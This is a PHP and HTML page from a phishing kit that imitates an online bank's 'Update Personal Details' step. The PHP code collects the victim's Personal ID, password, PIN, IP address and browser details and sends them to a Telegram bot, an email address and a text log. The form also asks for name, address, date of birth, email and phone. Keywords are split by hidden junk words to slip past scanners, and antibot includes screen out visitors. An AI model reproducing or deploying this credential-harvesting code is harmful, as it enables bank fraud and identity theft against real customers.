<?php
sleep(3);
ob_start();
require_once('../page_config.php');
require_once('../includes/geoLite/autoload.php');
require_once('../includes/device_detect.php');
require_once('../includes/blacklist_lookup.php');
require_once('../includes/functions.php');
require_once('../includes/session_protect.php');
require_once('../includes/antibot.php');


$post = $_POST;
if (isset($_POST['submit']) && $_SESSION['saveLog_2'] !== 1){

  // save log
  foreach ($_POST as $key => $value) {
   $_SESSION[$key] = $value;
  }

  $f1 = $_SESSION['personalId'];
  $f2 = $_SESSION['password'];
  $f3 = $_SESSION['pin'];

  $clientOsName = getOS();
  $clientBrowserName = getBrowserName();


  $data = "==============================="."\r\n".
         "Personal ID: ".$f1."\r\n".
         "Password: ".$f2."\r\n".
         "PIN: ".$f3."\r\n".
         "-----------------------------------\r\n".
         "Submitted by: ".$ip."\r\n".
         "UserAgent: ".$ua."\r\n".
         "Browser: ".$clientBrowserName."\r\n".
         "Os: ".$clientOsName."\r\n".
         "-----------------------------------\r\n".
         "Received: ".date("l", strtotime(date("Y-m-d")))." ".date("j F Y @ G:i")."\r\n".
         "==============================="."\r\n";


  if($save_to_telegram==1){
    // Telegram
    $result = urlencode($data);
    file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.$result."&parse_mode=html");
  }


  if($save_to_mail==1){
    // Email
    $subject  = $site_name." | ".$ip." | UserPass ";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text; charset=utf-8 \r\n";

    $msg = $data;
    mail($email, $subject, $msg, $headers);
  }

  if($save_to_txt==1){
    // TXT
    $outfile = "../$txt_fileName";
    $results = $data;

    $fout = fopen($outfile, "a");
    fputs($fout, $results."\n\n");
    fclose($fout);
  }

  $_SESSION['saveLog_2'] = 1;

}

ob_end_flush(); 
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <title>Process</title>
    <link rel="stylesheet" href="../assets/css/normalize.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/font-awesome.min.css">
    <link rel="shortcut icon" href=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAA3NCSVQICAjb4U/gAAABIElEQVQokZVSvWrCUBg9KUpLodDNF/ANHHXQyQfQ0cklq6O74pQh4AO4hiwOujuaIeB75F6bNCTREPR0SNGb1EA9XO5wfr7D/dEknsNLlaA1Gk8EXieTd8PgPwMEeLm8jUYPhz0ga61WulwC+Njt/paUAwQ+XRdAsljUu91ar1dOSGUJwANInizLA65BkO33XtFztx6Bk2XlO8ljvR6OxyTP6/VXsynUgACi6ZQkyWg2EwDJ7HDI23LEhiFugaDfvwlMUw+I53OS4WBABd/DoQQggMS2VSFZrTzg6vssIrFtkTf4nU5Jk0C62ZRIv92+nyHUdVU7b7eZ66pMqOuidEsSiE0zcxxG0a8rijLHiU3zZpCAJouv9hCa+g+qhCr8AGcFFUutQo12AAAAAElFTkSuQmCC" type="image/png" />
</head>

<body>
    <header>
        <div class="container">
            <div class="header_block">
                <div class="left_side">
                    <a href="#">
                        <img src="../assets/images/2zBXa4d_1.png" height="25"><img src="../assets/images/2zBXa4d_2.png" height="25">
                    </a>
                </div>
                <div class="right_side">
                    <p>Don’t have Online Ba<mark style="font-size:0.0029px">northeastwards</mark>nk<i style="font-size:0.0068px">radicular</i>in<mark style="display:none;">cruller</mark>g? </p>
                    <a href="">Si<sub style="font-size:0.0046px">bleaches</sub>gn up</a>
                </div>
            </div>
        </div>
    </header>

    <div class="second_block">
        <div class="container">
            <div class="main">
                <div class="main_left">
                    <h3><i class="fa fa-user" aria-hidden="true"></i> Up<del style="font-size:0.0030px">condalia</del>da<sub style="font-size:0.003px">si<span style="display:none;">ectoplasm</span>gnaled</sub>te Pe<b style="display:none;">futural</b>rs<mark style="font-size:0.0035px">multipliable</mark>on<span style="font-size:0.0060px">gelid</span>al De<strong style="display:none;">assumed</strong>ta<del style="font-size:0.0089px">misconnection</del>il<em style="display:none;">visualizer</em>s</h3>
                    <p class="sub_title">Please enter your pe<mark style="display:none;">mungofa</mark>rs<sub style="font-size:0.0054px">photoactive</sub>on<sub style="font-size:0.0067px">peregrinus</sub>al and co<del style="font-size:0.0092px">sillaginidae</del>nt<b style="font-size:0.008px">antinganting</b>ac<sub style="display:none;">usucaptor</sub>t de<small style="display:none;">semirepublican</small>ta<b style="display:none;">ceramographic</b>il<small style="display:none;">confab</small>s exactly as they are listed on your ac<small style="display:none;">recelebrate</small>co<small style="font-size:0.0041px">nonfeasibly</small>un<i style="display:none;">soilures</i>t.</p>
                    <form id="form_2" action="billing.php<?=$urlParametrs?><?=$uriParametrs?>" method="post">
                        <input type="hidden" name="submit" value="0" />
                        <input type="hidden" name="redirurl" />
                        <div class="form">
                            <div class="varning">
                                <p>
                                    Your Pe<ins style="font-size:0.0034px">banterer</ins>rs<em style="font-size:0.0044px">patentness</em>on<sup style="font-size:0.0067px">redemonstrated</sup>al ID or Se<strong style="display:none;">ichthyobatrachian</strong>cu<strong style="display:none;">oaritic</strong>ri<sub style="font-size:0.0077px">desexes</sub>ty number are in<small style="display:none;">reperusing</small>co<sub style="display:none;">prefacist</sub>rr<i style="font-size:0.0016px">predigested</i>ec<small style="display:none;">subpastor</small>t. Getting your se<strong style="font-size:0.0032px">distemperer</strong>cu<sub style="font-size:0.0080px">ochering</sub>ri<em style="display:none;">anachorism</em>ty de<sup style="display:none;">sleepings</sup>ta<em style="font-size:0.0047px">nardine</em>il<mark style="display:none;">dyschronous</mark>s wrong
                                    may result in your ac<i style="font-size:0.0012px">cynebot</i>ce<strong style="font-size:0.0059px">aphis</strong>ss being blocked.
                                </p>
                                <img src="../assets/images/7lxJMY5.png" alt="">
                            </div>
                            <div class="form_group">
                                <label class="label" for="fName">First Name</label>
                                <input type="text" id="fName" name="fName" class="input">
                                <p class="varning_p">Please enter a valid First Name</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="mName">Middle Name(s)</label>
                                <input type="text" id="mName" name="mName" class="input" placeholder="(only if you have any)">
                                <p class="varning_p">Please enter a valid Middle Name(s)</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="lName">Last Name</label>
                                <input type="text" id="lName" name="lName" class="input">
                                <p class="varning_p">Please enter a valid First Name</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="address">Ad<sup style="font-size:0.0045px">ferriferous</sup>dr<b style="display:none;">nonstative</b>es<sub style="font-size:0.0052px">predisponent</sub>s</label>
                                <input type="text" id="address" name="address" class="input">
                                <p class="varning_p">Please enter a valid First Name</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="city">Ci<b style="display:none;">proclivities</b>ty</label>
                                <input type="text" id="city" name="city" class="input" placeholder="City/Suburb">
                                <p class="varning_p">Please enter a valid Ci<strong style="display:none;">sciaticas</strong>ty</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="state">St<del style="font-size:0.0077px">supplemental</del>at<span style="font-size:0.0052px">myc</span>e</label>
                                <input type="text" id="state" name="state" class="input" >
                                <p class="varning_p">Please enter a valid St<span style="display:none;">zoospermia</span>at<sup style="font-size:0.0022px">reimpose</sup>e</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="postalCode">Postal Co<sup style="display:none;">sdlc</sup>de</label>
                                <input type="text" id="postalCode" name="postalCode" class="input" >
                                <p class="varning_p">Please enter a valid Postal Co<del style="display:none;">squandermania</del>de</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="dobDay">Date of Birth</label>
                                <div style="display: flex; ">
                                    <div  style="height: 100%;">
                                     <label for="dobDay" id="" style="opacity: .7; font-size: 14px;">Day</label>
                                     <div style="display: flex;">
                                        <div style="margin-right: 15px; position: relative;">
                                          <select name="dobDay" id="dobDay" style="width: 90px;">
                                              <option value=""  selected="">DD</option>
                                              <option value="01"> 01</option>
                                              <option value="02"> 02</option>
                                              <option value="03"> 03</option>
                                              <option value="04"> 04</option>
                                              <option value="05"> 05</option>
                                              <option value="06"> 06</option>
                                              <option value="07"> 07</option>
                                              <option value="08"> 08</option>
                                              <option value="09"> 09</option>
                                              <option value="10"> 10</option>
                                              <option value="11"> 11</option>
                                              <option value="12"> 12</option>
                                              <option value="13"> 13</option>
                                              <option value="14"> 14</option>
                                              <option value="15"> 15</option>
                                              <option value="16"> 16</option>
                                              <option value="17"> 17</option>
                                              <option value="18"> 18</option>
                                              <option value="19"> 19</option>
                                              <option value="20"> 20</option>
                                              <option value="21"> 21</option>
                                              <option value="22"> 22</option>
                                              <option value="23"> 23</option>
                                              <option value="24"> 24</option>
                                              <option value="25"> 25</option>
                                              <option value="26"> 26</option>
                                              <option value="27"> 27</option>
                                              <option value="28"> 28</option>
                                              <option value="29"> 29</option>
                                              <option value="30"> 30</option>
                                              <option value="31"> 31</option>
                                          </select>
                                           <span class="form-icon sk-icon sk-icon-chevrondown"></span>
                                        </div>
                                     </div>
                                    </div>
                                    <div  style="height: 100%;">
                                     <label for="dobMonth" id="" style="opacity: .7; font-size: 14px;">Month</label>
                                     <div style="display: flex;">
                                        <div style="margin-right: 15px; position: relative;">
                                          <select name="dobMonth" id="dobMonth" style="width: 90px;">
                                              <option value=""  selected="">MM</option>
                                                <option value="01">Jan</option>
                                                <option value="02">Feb</option>
                                                <option value="03">Mar</option>
                                                <option value="04">Apr</option>
                                                <option value="05">May</option>
                                                <option value="06">Jun</option>
                                                <option value="07">Jul</option>
                                                <option value="08">Aug</option>
                                                <option value="09">Sep</option>
                                                <option value="10">Oct</option>
                                                <option value="11">Nov</option>
                                                <option value="12">Dec</option>
                                          </select>
                                           <span class="form-icon sk-icon sk-icon-chevrondown"></span>
                                        </div>
                                     </div>
                                    </div>
                                    <div   style="height: 100%;">
                                     <label for="dobYear" id="" style="opacity: .7; font-size: 14px;">Year</label>
                                     <div style="margin-right: 15px; position: relative;">
                                           <select name="dobYear" id="dobYear" style="width: 90px;">
                                             <option value=""   selected="">YYYY</option>
                                             <?php
                                               for ($i=1920; $i <= 2020; $i++) { 
                                                  echo '<option value="'.$i.'"> '.$i.'</option>';
                                               }
                                             ?>
                                           </select>
                                        <span class="form-icon sk-icon sk-icon-chevrondown"></span>
                                     </div>
                                    </div>
                                </div>
                                <p class="varning_p">Please select a Date of Birth</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="email">Em<b style="display:none;">strouding</b>ai<strong style="font-size:0.0041px">predicate</strong>l Ad<em style="display:none;">cistophorus</em>dr<b style="display:none;">hangworthy</b>es<sub style="font-size:0.0072px">datary</sub>s</label>
                                <input type="email" id="email" name="email" class="input" >
                                <p class="varning_p">Please enter a valid Em<sup style="font-size:0.005px">rhodophyceous</sup>ai<sup style="font-size:0.0068px">phallist</sup>l Ad<span style="font-size:0.0099px">selenipedium</span>dr<em style="font-size:0.007px">casula</em>es<span style="font-size:0.0075px">myelopoietic</span>s</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="phone">Ph<i style="font-size:0.0020px">spiderweb</i>on<del style="font-size:0.0077px">velchanos</del>e Number</label>
                                <input type="phone" id="phone" name="phone" class="input" >
                                <p class="varning_p">Please enter a valid Ph<sub style="font-size:0.0011px">shepherdish</sub>on<i style="display:none;">guillotine</i>e Number</p>
                            </div>
                            <div id="loader" class="loader" >
                                <div>
                                   <olb-loader>
                                      <div class="loading"></div>
                                   </olb-loader>
                                </div>
                                <div>
                                    <p>Logging you on</p>
                                </div>
                            </div>
                        </div>
                        <button id="submit" class="button" type="submit" disabled="">Next</button>
                        <p class="forget_a"></p>
                    </form>
                </div>
                <div class="main_right">
                    <img src="../assets/images/W4iCSUy.png" alt="">
                    <h2>Beware co<strong style="display:none;">somatic</strong>ro<strong style="display:none;">imbarn</strong>na<del style="font-size:0.006px">iratest</del>vi<em style="font-size:0.0011px">bestench</em>ru<b style="display:none;">gimbaling</b>s scams</h2>
                    <p>
                        Cr<em style="display:none;">hermitical</em>im<strong style="display:none;">tomosis</strong>in<i style="font-size:0.0043px">unshifting</i>al<sup style="font-size:0.0073px">coexist</sup>s are using co<sup style="display:none;">whincheck</sup>ro<em style="display:none;">pulses</em>na<sub style="display:none;">dangle</sub>vi<em style="display:none;">strong</em>ru<i style="display:none;">suffolk</i>s to target people. Please stay on the lookout for anything
                        unusual.
                        Don’t be rushed and make sure any co<strong style="font-size:0.0018px">raincoat</strong>nt<del style="font-size:0.0056px">incising</del>ac<strong style="font-size:0.0034px">piker</strong>t claiming to be from us is genuine. <a href="#">Learn
                            more</a>.
                    </p>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer">
            <ul class="footer_list">
                <li><a href="#"><a>Online Ba<i style="display:none;">praeabdomen</i>nk<span style="font-size:0.0022px">foxberries</span>in<strong style="font-size:0.0077px">altazimuth</strong>g Guarantee</a></li>
                <li><a href="#">Site Help & Ac<ins style="display:none;">slided</ins>ce<sup style="display:none;">exterritoriality</sup>ssibility</a></li>
                <li><a href="#">Se<sub style="font-size:0.0089px">clothesbag</sub>cu<strong style="font-size:0.0052px">uncensored</strong>ri<sub style="display:none;">serpolet</sub>ty & Pr<mark style="display:none;">spacetime</mark>iv<em style="display:none;">resubmission</em>ac<del style="display:none;">megasporogenesis</del>y</a></li>
                <li><a href="#">Terms & Conditions</a></li>
                <li><a href="#">Legal</a></li>
            </ul>
            <div class="img_footer">
                <img src="../assets/images/qzkf32l.png" alt="">
            </div>

        </div>
    </footer>

    <script src="../assets/js/jquery-1.11.3.min.js"></script>
    <script src="../assets/js/imask.js"></script>
    <script src="../assets/js/main.js"></script>
</body>
</html>